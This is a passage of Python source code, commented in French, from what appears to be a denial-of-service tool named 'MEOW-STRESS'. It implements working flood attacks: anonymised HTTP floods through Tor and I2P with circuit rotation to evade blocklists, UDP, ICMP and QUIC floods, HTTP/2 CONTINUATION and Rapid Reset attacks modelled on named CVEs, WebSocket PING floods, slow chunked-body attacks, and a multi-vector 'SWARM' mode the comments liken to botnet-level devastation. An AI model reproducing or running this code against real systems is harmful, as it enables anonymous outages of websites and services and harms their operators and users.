            ok(f"Tor {ver} extrait dans {tor_dir}")
            _launch_tor_windows(tor_exe, tor_dir)
            return True
        except Exception as e:
            warn(f"  {ver} : {e}")
    err("Impossible de télécharger Tor Expert Bundle.")
    info("Télécharge manuellement : https://www.torproject.org/download/tor/")
    return False

_tor_proc_ref = [None]  # stocke le process Tor lancé

def _launch_tor_windows(tor_exe, tor_dir):
    """Lance tor.exe en arrière-plan sur Windows."""
    if not os.path.exists(tor_exe):
        return
    try:
        p = _sp.Popen([tor_exe], cwd=tor_dir,
                      stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                      creationflags=_sp.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
        _tor_proc_ref[0] = p
        info("Tor lancé en arrière-plan (tor.exe)...")
    except Exception as e:
        warn(f"Impossible de lancer tor.exe : {e}")

def _ensure_tor():
    """
    S'assure que Tor tourne sur 127.0.0.1:9050.
    Installe et démarre automatiquement si absent.
    Retourne True si Tor est opérationnel.
    """
    if _tor_available():
        return True

    warn("Tor non détecté — installation automatique...")
    console.print()

    if sys.platform == "win32":
        # 1. Chercher tor.exe du Tor Browser installé
        tb_paths = [
            r"C:\Users\{}\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe".format(
                os.environ.get("USERNAME", "user")),
            r"C:\Program Files\Tor Browser\Browser\TorBrowser\Tor\tor.exe",
            r"C:\Program Files (x86)\Tor Browser\Browser\TorBrowser\Tor\tor.exe",
        ]
        for p in tb_paths:
            if os.path.exists(p):
                info(f"Tor Browser trouvé : {p}")
                _launch_tor_windows(p, os.path.dirname(p))
                if _wait_port("127.0.0.1", 9050, timeout=30, label="Tor"):
                    return True
        # 2. Essai winget
        info("Essai installation via winget...")
        try:
            _sp.run(["winget", "install", "-e", "--id",
                     "TorProject.TorBrowser", "--silent", "--accept-package-agreements"],
                    timeout=300, check=True, capture_output=True)
            ok("Tor Browser installé via winget.")
            info("Ouvre Tor Browser une première fois pour démarrer Tor sur le port 9050.")
            return False  # l'utilisateur doit l'ouvrir manuellement
        except Exception:
            pass
        # 3. Télécharger l'expert bundle
        if _download_tor_windows():
            if _wait_port("127.0.0.1", 9050, timeout=60, label="Tor"):
                return True
    else:
        # Linux / macOS
        pkg_map = {
            "apt-get": ["tor"],
            "apt":     ["tor"],
            "dnf":     ["tor"],
            "yum":     ["tor"],
            "pacman":  ["tor"],
            "brew":    ["tor"],
        }
        if _sys_install(pkg_map):
            _start_tor_service()
            if _wait_port("127.0.0.1", 9050, timeout=45, label="Tor"):
                return True

    err("Tor n'a pas pu être démarré automatiquement.")
    console.print(f"  [{CY}]Windows :[/] Ouvre Tor Browser → le port 9050 s'active")
    console.print(f"  [{CY}]Linux   :[/] sudo apt install tor && sudo systemctl start tor")
    console.print(f"  [{CY}]macOS   :[/] brew install tor && brew services start tor")
    return False

def _ensure_i2p():
    """
    S'assure que le proxy I2P tourne sur 127.0.0.1:4444.
    Installe et démarre automatiquement sur Linux si absent.
    Retourne True si I2P est opérationnel.
    """
    if _i2p_available():
        return True

    warn("I2P non détecté — tentative d'installation automatique...")
    console.print()

    if sys.platform == "linux":
        pkg_map = {
            "apt-get": ["i2p"],
            "apt":     ["i2p"],
        }
        if _sys_install(pkg_map):
            try:
                _sp.Popen(["i2prouter", "start"],
                          stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
                ok("i2prouter start lancé — attente démarrage (peut prendre 1-2 min)...")
                if _wait_port("127.0.0.1", 4444, timeout=120, label="I2P"):
                    ok("I2P proxy HTTP opérationnel sur 127.0.0.1:4444")
                    return True
            except Exception as e:
                warn(f"i2prouter : {e}")
    elif sys.platform == "darwin":
        info("Sur macOS, installe I2P manuellement :")
    else:  # Windows
        info("Sur Windows, installe I2P manuellement :")

    err("I2P n'a pas pu être démarré automatiquement.")
    console.print(f"  [{CY}]Linux   :[/] sudo apt install i2p && i2prouter start")
    console.print(f"  [{CY}]Windows :[/] https://geti2p.net/en/download → active le proxy HTTP port 4444")
    console.print(f"  [{CY}]macOS   :[/] https://geti2p.net/en/download → java -jar i2pinstall.jar")
    return False

def _ensure_stem():
    """Installe stem si absent (nécessaire pour le circuit renewal Tor)."""
    try:
        import stem  # noqa
        return True
    except ImportError:
        return _pip_install("stem")

def _ensure_socks():
    """Installe PySocks si absent."""
    global HAS_SOCKS, _socks
    if HAS_SOCKS:
        return True
    if _pip_install("PySocks"):
        try:
            import socks as _socks  # noqa: F811
            HAS_SOCKS = True
            return True
        except ImportError:
            pass
    return False

# ─── SPECTER — Tor Anonymous Flood ──────────────────────────

_TOR_SOCKS      = {"http": "socks5://127.0.0.1:9050",
                   "https": "socks5://127.0.0.1:9050"}
_TOR_CTRL_PORT  = 9051


def _tor_available() -> bool:
    """Vérifie si le daemon Tor tourne sur 127.0.0.1:9050."""
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("127.0.0.1", 9050))
        s.close()
        return True
    except Exception:
        return False


def _tor_get_exit_ip() -> str:
    """Retourne l'IP de sortie Tor actuelle via check.torproject.org."""
    try:
        r = _req.get("https://check.torproject.org/api/ip",
                     proxies=_TOR_SOCKS, timeout=10, verify=False)
        data = r.json()
        return data.get("IP", "?")
    except Exception:
        return "?"


def _tor_new_circuit() -> bool:
    """
    Demande un nouveau circuit Tor via le Control Port 9051.
    Requiert stem + HashedControlPassword ou CookieAuthentication dans torrc.
    Retourne True si succès, False si stem absent ou ctrl port fermé.
    """
    try:
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=_TOR_CTRL_PORT) as ctrl:
            ctrl.authenticate()          # tente cookie puis password vide
            ctrl.signal(Signal.NEWNYM)
            return True
    except Exception:
        return False


def _worker_specter(url: str, stats: Stats, ua_list: list,
                    renew_every: int,
                    circuit_lock: threading.Lock,
                    request_counter: list,
                    exit_ip_ref: list):
    """
    SPECTER — Flood entièrement anonymisé via réseau Tor.

    Architecture :
      Attaquant → Tor Guard → Tor Middle → Tor Exit → Cible
      La cible ne voit QUE l'adresse de l'exit node Tor.
      L'IP d'origine n'apparaît nulle part dans les logs du serveur.

    Circuit renewal :
      Toutes les `renew_every` requêtes (coordonné entre tous les workers),
      un seul worker déclenche NEWNYM → nouveau circuit → nouvel exit IP.
      Les autres workers recréent leurs sessions pour forcer le nouveau circuit.
    """
    session = _req.Session()
    local_count = 0

    while not _STOP.is_set():
        # ── Décision de renouvellement (coordonné) ────────────────
        do_renew = False
        with circuit_lock:
            request_counter[0] += 1
            if request_counter[0] % renew_every == 0:
                do_renew = True

        if do_renew:
            renewed = _tor_new_circuit()
            if renewed:
                # Attendre que le nouveau circuit soit établi
                time.sleep(1.2)
                # Rafraîchir l'exit IP affiché
                try:
                    new_ip = _tor_get_exit_ip()
                    exit_ip_ref[0] = new_ip
                except Exception:
                    pass
            # Nouvelle session pour coller au nouveau circuit
            session = _req.Session()

        t0 = time.perf_counter()
        try:
            r = session.get(
                url,
                headers={
                    "User-Agent":      random.choice(ua_list),
                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Cache-Control":   "no-cache",
                    "Connection":      "close",
                    "X-Request-ID":    _rand_str(16),
                },
                proxies=_TOR_SOCKS,
                timeout=25,          # Tor est lent → timeout plus long
                allow_redirects=False,
                verify=False,
            )
            elapsed = time.perf_counter() - t0
            stats.hit(r.status_code < 500, elapsed * 1000, len(r.content))
        except Exception:
            stats.hit(False)

        local_count += 1


# ─── WRAITH — I2P Anonymous Flood ────────────────────────────

_I2P_HTTP_PROXY = {"http":  "http://127.0.0.1:4444",
                   "https": "http://127.0.0.1:4444"}


def _i2p_available() -> bool:
    """Vérifie si le proxy HTTP I2P tourne sur 127.0.0.1:4444."""
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("127.0.0.1", 4444))
        s.close()
        return True
    except Exception:
        return False


def _i2p_get_router_info() -> str:
    """Récupère l'état du routeur I2P via son API REST (port 7657)."""
    try:
        r = _req.get("http://127.0.0.1:7657/jsonrpc/", timeout=3,
                     json={"id": 1, "method": "RouterInfo", "params": []})
        return r.json().get("result", {}).get("version", "?")
    except Exception:
        return "?"


def _worker_wraith(url: str, stats: Stats, ua_list: list):
    """
    WRAITH — Flood via réseau I2P (garlic routing).

    Architecture :
      Attaquant → Tunnel I2P inbound → Outproxy I2P → Cible
      Garlic routing = plusieurs messages bundlés dans un "bulb"
      L'outproxy voit une IP I2P, la cible voit l'outproxy — jamais l'origine.

    Avantages vs Tor :
      · Pool d'IPs différent — les blocklists Tor ne fonctionnent pas
      · Garlic routing rend l'analyse de trafic plus difficile que onion
      · Tunnels P2P régénérés automatiquement toutes les 10 min
      · Quasi inconnu des WAF/CDN — rarement filtré
      · Pas besoin de gestion manuelle des circuits

    Requiert I2P installé avec proxy HTTP sur 127.0.0.1:4444.
    """
    session = _req.Session()

    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            r = session.get(
                url,
                headers={
                    "User-Agent":      random.choice(ua_list),
                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Cache-Control":   "no-cache",
                    "Connection":      "close",
                    "X-Request-ID":    _rand_str(16),
                },
                proxies=_I2P_HTTP_PROXY,
                timeout=30,      # I2P est lent mais plus stable que Tor
                allow_redirects=False,
                verify=False,
            )
            elapsed = time.perf_counter() - t0
            stats.hit(r.status_code < 500, elapsed * 1000, len(r.content))
        except Exception:
            stats.hit(False)


# ─── MIRROR HELPERS ──────────────────────────────────────────

class _MirrorCycle:
    """
    Distributeur thread-safe de cibles en round-robin.
    Chaque worker appelle .next() pour obtenir la prochaine URL/host.
    """
    def __init__(self, targets: list):
        self._t   = list(targets)
        self._idx = 0
        self._lk  = threading.Lock()

    def next(self) -> str:
        with self._lk:
            v = self._t[self._idx % len(self._t)]
            self._idx += 1
            return v

    def random(self) -> str:
        return random.choice(self._t)

    def __len__(self):
        return len(self._t)


def _worker_http_mirror(mirror: _MirrorCycle, stats: Stats, use_proxy: bool,
                        ua_list: list, use_cffi: bool = False):
    """
    L7 Mirror — GET flood sur plusieurs URLs en rotation round-robin.
    Chaque requête part vers une cible différente.
    Incompatible avec keep-alive (Connection: close forcé) → force new session.
    """
    while not _STOP.is_set():
        url = mirror.next()
        session = _make_session(use_cffi)
        t0 = time.perf_counter()
        try:
            r = session.get(
                url,
                headers={
                    "User-Agent":      random.choice(ua_list),
                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control":   "no-cache, no-store",
                    "Pragma":          "no-cache",
                    "Connection":      "close",
                    "X-Request-ID":    _rand_str(16),
                },
                proxies=_get_proxy() if use_proxy else None,
                timeout=8, allow_redirects=False, verify=False,
            )
            elapsed = time.perf_counter() - t0
            stats.hit(r.status_code < 500, elapsed * 1000, len(r.content))
        except Exception:
            stats.hit(False)


def _worker_icmp_mirror(mirror: _MirrorCycle, stats: Stats):
    """
    L3 Mirror — ICMP flood sur plusieurs hôtes en rotation round-robin.
    """
    import subprocess
    while not _STOP.is_set():
        host = mirror.next()
        try:
            cmd = ["ping", "-n", "1", "-w", "500", host] if os.name == "nt" \
                  else ["ping", "-c", "1", "-W", "1", host]
            r = subprocess.run(cmd, capture_output=True, timeout=3)
            stats.hit(r.returncode == 0)
        except Exception:
            stats.hit(False)


def _worker_udp_mirror(mirror: _MirrorCycle, port: int, stats: Stats):
    """L4 Mirror — UDP flood sur plusieurs hôtes en rotation."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not _STOP.is_set():
        host = mirror.next()
        try:
            payload = os.urandom(random.randint(64, 1024))
            sock.sendto(payload, (host, port))
            stats.hit(True, nbytes=len(payload))
        except Exception:
            stats.hit(False)
    sock.close()


# ─── UTILS ───────────────────────────────────────────────────

def _rand_str(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

# ─── H2 FRAME PRIMITIVES ─────────────────────────────────────

def _h2_frame_raw(type_id: int, flags: int, stream_id: int,
                  payload: bytes = b"") -> bytes:
    """Construct a raw HTTP/2 frame (RFC 7540 §4.1)."""
    ln = len(payload)
    return (
        struct.pack(">I", ln)[1:4]
        + bytes([type_id, flags])
        + struct.pack(">I", stream_id & 0x7FFFFFFF)
        + payload
    )

_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def _h2_hpack_headers(host: str, ua: str = "Mozilla/5.0") -> bytes:
    """
    Minimal HPACK (static-table only, no Huffman) for a basic GET /.
    Static table: [2]=:method GET  [4]=:path /  [7]=:scheme https  [1]=:authority.
    """
    encoded = bytes([0x82, 0x84, 0x87])
    host_b  = host.encode("utf-8", errors="replace")[:250]
    encoded += bytes([0x41]) + bytes([len(host_b)]) + host_b
    ua_b    = ua.encode("utf-8", errors="replace")[:250]
    name_b  = b"user-agent"
    encoded += (bytes([0x00]) + bytes([len(name_b)]) + name_b
                + bytes([len(ua_b)]) + ua_b)
    return encoded


def _h2_hpack_junk(n: int = 5) -> bytes:
    """Generate n random HPACK literal headers (new name, no indexing) for spam."""
    out = b""
    for _ in range(n):
        k = f"x-{_rand_str(8)}".encode()
        v = os.urandom(16).hex().encode()
        out += bytes([0x00]) + bytes([len(k)]) + k + bytes([len(v)]) + v
    return out


# ─── H2_CONTINUATION — HTTP/2 CONTINUATION Frame Flood ───────
#
#  CVE-2024-27316 style.
#  HEADERS with END_HEADERS=0 forces the server to buffer every subsequent
#  CONTINUATION frame until it sees END_HEADERS.  Sending 3 000+
#  CONTINUATION frames per connection → server OOM / thread starvation on
#  unpatched Apache httpd, nginx <1.25.3, IIS, and many others.

def _worker_h2_continuation(host: str, port: int, stats: Stats,
                             ua_list: list):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try: ctx.set_alpn_protocols(["h2"])
    except Exception: pass

    while not _STOP.is_set():
        raw = tls_c = None
        try:
            raw   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(10)
            raw.connect((host, port))
            tls_c = ctx.wrap_socket(raw, server_hostname=host)

            hdrs = _h2_hpack_headers(host, random.choice(ua_list))
            tls_c.sendall(_H2_PREFACE)
            tls_c.sendall(_h2_frame_raw(0x4, 0x0, 0))        # SETTINGS empty
            tls_c.sendall(_h2_frame_raw(0x1, 0x0, 1, hdrs))  # HEADERS no END_HEADERS

            sent = 0
            for i in range(3000):
                if _STOP.is_set(): break
                tls_c.sendall(_h2_frame_raw(0x9, 0x0, 1, _h2_hpack_junk(5)))
                sent += 1
                if sent % 200 == 0:
                    time.sleep(0.001)
            stats.hit(True, nbytes=sent * 50)
        except Exception:
            stats.hit(False)
        finally:
            for c in (tls_c, raw):
                try:
                    if c: c.close()
                except Exception: pass


# ─── H2_RST — HTTP/2 Rapid Reset Storm ───────────────────────
#
#  CVE-2023-44487 style — opens N streams per TCP connection then
#  immediately RST_STREAMs each one.  Per-stream alloc/dealloc cycles
#  → CPU thrashing on the server.

def _worker_h2_rst(host: str, port: int, stats: Stats, ua_list: list):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    try: ctx.set_alpn_protocols(["h2"])
    except Exception: pass

    settings_payload = (struct.pack(">HI", 0x4, 65535) +
                        struct.pack(">HI", 0x5, 16777215))

    while not _STOP.is_set():
        raw = tls_c = None
        try:
            raw   = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(8)
            raw.connect((host, port))
            tls_c = ctx.wrap_socket(raw, server_hostname=host)

            tls_c.sendall(_H2_PREFACE)
            tls_c.sendall(_h2_frame_raw(0x4, 0x0, 0, settings_payload))
            hdrs = _h2_hpack_headers(host, random.choice(ua_list))

            for sid in range(1, 201, 2):
                if _STOP.is_set(): break
                tls_c.sendall(_h2_frame_raw(0x1, 0x4, sid, hdrs))
                tls_c.sendall(_h2_frame_raw(0x3, 0x0, sid,
                                            struct.pack(">I", 0x8)))
                stats.hit(True, nbytes=50)
                if sid % 40 == 1: time.sleep(0.001)
        except Exception:
            stats.hit(False)
        finally:
            for c in (tls_c, raw):
                try:
                    if c: c.close()
                except Exception: pass


# ─── WS_FLOOD — WebSocket PING Flood ─────────────────────────
#
#  RFC 6455 §5.5.2 mandates servers MUST respond to every PING with PONG.
#  Hundreds of PINGs/s per connection → server parse + queue overhead.

def _ws_ping_frame() -> bytes:
    mask    = os.urandom(4)
    payload = os.urandom(4)
    masked  = bytes(payload[i] ^ mask[i % 4] for i in range(4))
    return bytes([0x89, 0x84]) + mask + masked


def _ws_upgrade(host: str, port: int, path: str, use_ssl: bool):
    import base64 as _b64
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        key = _b64.b64encode(os.urandom(16)).decode()
        s.sendall((
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
            f"User-Agent: Mozilla/5.0\r\n\r\n"
        ).encode())
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(1024)
            if not chunk: break
            buf += chunk
        if b"101" in buf: return s
        s.close(); return None
    except Exception:
        try: s.close()
        except: pass
        return None


def _worker_ws_flood(host: str, port: int, path: str, use_ssl: bool,
                     stats: Stats):
    """WebSocket PING flood — RFC 6455 mandates server PONG on every PING."""
    ping = _ws_ping_frame()
    while not _STOP.is_set():
        ws = _ws_upgrade(host, port, path, use_ssl)
        if ws is None:
            stats.hit(False); time.sleep(0.5); continue
        try:
            ws.settimeout(5)
            while not _STOP.is_set():
                ws.sendall(ping)
                stats.hit(True, nbytes=10)
                try: ws.recv(32)
                except Exception: break
                time.sleep(0.01)
        except Exception:
            stats.hit(False)
        finally:
            try: ws.close()
            except: pass


# ─── SLOW_CHUNK — Chunked Transfer Slow Body ─────────────────
#
#  Improved RUDY: Transfer-Encoding: chunked instead of Content-Length.
#  Server cannot predict body size → bypasses Content-Length-based RUDY
#  defenses.  Sends one 1-byte chunk every ~500ms, never the "0\r\n\r\n"
#  terminator → connection held open indefinitely.

def _worker_slow_chunk(host: str, port: int, path: str, use_ssl: bool,
                       stats: Stats, ua_list: list):
    """Chunked slow body — server waits forever for the terminating 0 chunk."""
    while not _STOP.is_set():
        conn = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(120)
            s.connect((host, port))
            if use_ssl:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                conn = ctx.wrap_socket(s, server_hostname=host)
            else:
                conn = s
            ua  = random.choice(ua_list)
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
            )
            conn.sendall(req.encode())
            stats.hit(True, nbytes=len(req))
            while not _STOP.is_set():
                chunk = f"1\r\n{random.choice(string.ascii_lowercase)}\r\n"
                conn.sendall(chunk.encode())
                stats.hit(True, nbytes=4)
                time.sleep(random.uniform(0.4, 0.6))
        except Exception:
            stats.hit(False)
        finally:
            try:
                if conn: conn.close()
            except Exception: pass


# ─── QUIC_FLOOD — UDP/QUIC HTTP3 Flood ───────────────────────
#
#  QUIC (RFC 9000) runs on UDP/443 — far less protected than TCP on most
#  firewalls.  Sends QUIC Initial packets forcing version-negotiation CPU
#  overhead on servers with HTTP/3 (Cloudflare, nginx ≥1.25, Caddy, etc.)

def _worker_quic_flood(host: str, port: int, stats: Stats):
    """QUIC Initial packet flood (RFC 9000) — UDP, forces version-negotiation."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while not _STOP.is_set():
            try:
                plen   = random.randint(1200, 1350)
                packet = (
                    bytes([0xC0])
                    + struct.pack(">I", 0x00000001)
                    + bytes([0x08]) + os.urandom(8)
                    + bytes([0x08]) + os.urandom(8)
                    + bytes([0x00])
                    + struct.pack(">H", 0x4000 | (plen + 4))
                    + bytes([random.randint(0, 127)])
                    + os.urandom(plen)
                )
                sock.sendto(packet, (host, port))
                stats.hit(True, nbytes=len(packet))
            except Exception:
                stats.hit(False)
    finally:
        sock.close()


# ─── PHANTOM_MIX — Tor + I2P Rotating Anon Flood ─────────────
#
#  Combines SPECTER (Tor) and WRAITH (I2P) in a single worker.
#  Requests alternate between the two networks at random (50/50 when both
#  available).  Two distinct exit IP pools → blocking one doesn't stop the
#  other.  Auto-falls back to whichever anonymizer is still reachable.

def _worker_phantom_mix(url: str, stats: Stats, ua_list: list):
    """Tor + I2P rotating flood — two anonymous exit pools, auto-fallback."""
    tor_ok = _tor_available()
    i2p_ok = _i2p_available()
    if not tor_ok and not i2p_ok:
        err("PHANTOM_MIX: ni Tor ni I2P détecté — impossible de démarrer")
        return
    session = _req.Session()
    while not _STOP.is_set():
        if tor_ok and i2p_ok:
            proxy = _TOR_SOCKS if random.random() < 0.5 else _I2P_HTTP_PROXY
        elif tor_ok:
            proxy = _TOR_SOCKS
        else:
            proxy = _I2P_HTTP_PROXY
        timeout = 25 if proxy is _TOR_SOCKS else 30
        t0 = time.perf_counter()
        try:
            r = session.get(
                url,
                headers={
                    "User-Agent":    random.choice(ua_list),
                    "Accept":        "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Cache-Control": "no-cache",
                    "Connection":    "close",
                    "X-Request-ID":  _rand_str(16),
                },
                proxies=proxy, timeout=timeout,
                allow_redirects=False, verify=False,
            )
            stats.hit(r.status_code < 500, (time.perf_counter()-t0)*1000, len(r.content))
        except Exception:
            stats.hit(False)
            if proxy is _TOR_SOCKS and not _tor_available():         tor_ok = False
            elif proxy is _I2P_HTTP_PROXY and not _i2p_available(): i2p_ok = False


def _parse_target(target: str) -> tuple:
    if "://" not in target:
        target = "http://" + target
    p = urlparse(target)
    host = p.hostname or target
    port = p.port or (443 if p.scheme == "https" else 80)
    return host, port, target

# ─── SWARM — Multi-Vector Simultaneous Attack ────────────────
#
#  Splits workers across 5 attack vectors simultaneously.
#  No single mitigation strategy can stop all vectors at once.
#  Closest to botnet-level devastation achievable from one machine.
#
#  Distribution:
#    30% HTTP_BYPASS   — WAF/CDN cache-bust evasion
#    25% PULSAR        — synchronized burst waves (sature accept() OS)
#    20% HTTP_COOKIE   — session store exhaustion
#    15% SLOWLORIS     — connection slot exhaustion
#    10% TLS           — per-connection crypto overhead

def _run_swarm(target: str, workers: int, duration: int,
               use_proxy: bool, use_cffi: bool = False):
    stats = Stats()
    _STOP.clear()
    host, port, url = _parse_target(target)

    if use_proxy:
        alive = _proxy_healthcheck(url, sample=50, timeout=4)
        if alive == 0:
            warn("Aucun proxy vivant — SWARM sans proxy.")
            use_proxy = False

    base_lat     = _calibrate_resonance(url, use_proxy, n=3)
    pulsar_sleep = [max(0.05, base_lat * 0.40)]

    w_bypass = max(1, int(workers * 0.30))
    w_pulsar = max(1, int(workers * 0.25))
    w_cookie = max(1, int(workers * 0.20))
    w_slow   = max(1, int(workers * 0.15))
    w_tls    = max(1, workers - w_bypass - w_pulsar - w_cookie - w_slow)
    pulsar_barrier = threading.Barrier(w_pulsar, timeout=6)

    ok(f"[bold {G1}]SWARM[/] — [{G1}]{workers}[/] workers / 5 vecteurs simultanés :")
    console.print(f"  [{OR}]HTTP_BYPASS[/]  {w_bypass:>3} workers  (WAF/CDN evasion)")
    console.print(f"  [{OR}]PULSAR[/]       {w_pulsar:>3} workers  (synchronized bursts)")
    console.print(f"  [{OR}]HTTP_COOKIE[/]  {w_cookie:>3} workers  (session store flood)")
    console.print(f"  [{OR}]SLOWLORIS[/]    {w_slow:>3} workers  (connection slots)")
    console.print(f"  [{OR}]TLS[/]          {w_tls:>3} workers  (handshake overhead)")
    console.print()

    threads = []
    for _ in range(w_bypass):
        t = threading.Thread(target=_worker_http_bypass,
                             args=(url, stats, use_proxy, UA_LIST), daemon=True)
        t.start(); threads.append(t)
    for _ in range(w_pulsar):
        t = threading.Thread(target=_worker_pulsar,
                             args=(url, stats, use_proxy, UA_LIST,
                                   pulsar_barrier, pulsar_sleep, use_cffi), daemon=True)
        t.start(); threads.append(t)
    for _ in range(w_cookie):
        t = threading.Thread(target=_worker_http_cookie,
                             args=(url, stats, use_proxy, UA_LIST), daemon=True)
        t.start(); threads.append(t)
    for _ in range(w_slow):
        t = threading.Thread(target=_worker_slowloris,
                             args=(host, port, stats, use_proxy), daemon=True)
        t.start(); threads.append(t)
    for _ in range(w_tls):
        t = threading.Thread(target=_worker_tls,
                             args=(host, port, stats, use_proxy), daemon=True)
        t.start(); threads.append(t)

    swarm_label = (f"BYPASS×{w_bypass} PULSAR×{w_pulsar} "
                   f"COOKIE×{w_cookie} SLOW×{w_slow} TLS×{w_tls}")
    end_time = time.time() + duration
    try:
        with Live(console=console, refresh_per_second=4) as live:
            while time.time() < end_time and not _STOP.is_set():
                remaining = max(0, end_time - time.time())
                tbl = stats.render_table(target, "SWARM", True)
                live.update(Panel(
                    tbl,
                    title=(f"[bold {RD}]◈ MEOW-STRESS :: SWARM ◈  "
                           f"[{OR}]{remaining:.0f}s remaining[/]"),
                    subtitle=f"[{G1}]MULTI-VECTOR[/]  [{CY}]{swarm_label}[/]",
                    border_style=RD,
                ))
                time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        _STOP.set()
        try: pulsar_barrier.abort()
        except: pass

    console.print()
    console.print(Panel(
        stats.render_table(target, "SWARM", False),
        title=f"[bold {G1}]◈ ATTACK COMPLETE ◈",
        border_style=G2
    ))
    _save_results(target, "SWARM", stats, workers, duration)


# ─── LIVE DISPLAY ────────────────────────────────────────────

def _run_attack(target: str, method: str, workers: int, duration: int,
                use_proxy: bool, use_cffi: bool = False,
                extra_targets: list | None = None):
    """
    extra_targets : liste de cibles supplémentaires pour le mirror mode.
    Si fournie, le worker HTTP_MIRROR / ICMP_MIRROR / UDP_MIRROR est utilisé
    et les requêtes tournent sur toutes les cibles (target inclus) en round-robin.
    """
    stats = Stats()
    _STOP.clear()

    host, port, url = _parse_target(target)
    parsed_path = urlparse(url).path or "/"
    use_ssl     = url.startswith("https://")

    # ── Mirror mode ──────────────────────────────────────────────
    mirror_targets_raw = [target] + (extra_targets or [])
    mirror_mode = len(mirror_targets_raw) > 1

    HTTP_METHODS = {"HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS",
                    "HTTP_JSON","HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
                    "RESONANCE","PULSAR","SPECTER","WRAITH","PHANTOM_MIX"}
    SOCKET_METHODS = {"SLOWLORIS","RUDY","TLS","TCP"}

    if method in HTTP_METHODS and not HAS_REQUESTS and not HAS_CFFI:
        err("requests or curl_cffi required for HTTP methods."); return

    if use_cffi and not HAS_CFFI:
        warn("curl_cffi not installed — falling back to requests (no CF bypass).")
        warn("  Install: pip install curl_cffi")
        use_cffi = False

    if use_cffi:
        ok(f"[bold {G1}]curl_cffi mode[/] — TLS fingerprint = Chrome (Cloudflare bypass actif)")

    # ── SPECTER : auto-install Tor + stem ─────────────────────
    specter_lock    = None
    specter_counter = None
    specter_exit_ip = None
    specter_renew   = None
    if method == "SPECTER":
        if not _ensure_tor():
            err("Tor indisponible — SPECTER annulé."); return
        # stem pour circuit renewal (optionnel mais recommandé)
        _ensure_stem()
        info(f"Tor opérationnel sur [{G1}]127.0.0.1:9050[/] — récupération de l'exit IP...")
        initial_exit = _tor_get_exit_ip()
        ok(f"Exit IP actuelle : [{G1}]{initial_exit}[/]")
        specter_exit_ip = [initial_exit]
        specter_lock    = threading.Lock()
        specter_counter = [0]
        specter_renew   = workers * 3
        ok(f"Circuit renewal : toutes les [{G1}]{specter_renew}[/] requêtes")
        console.print()

    # ── PHANTOM_MIX : auto-install Tor + I2P ────────────────────
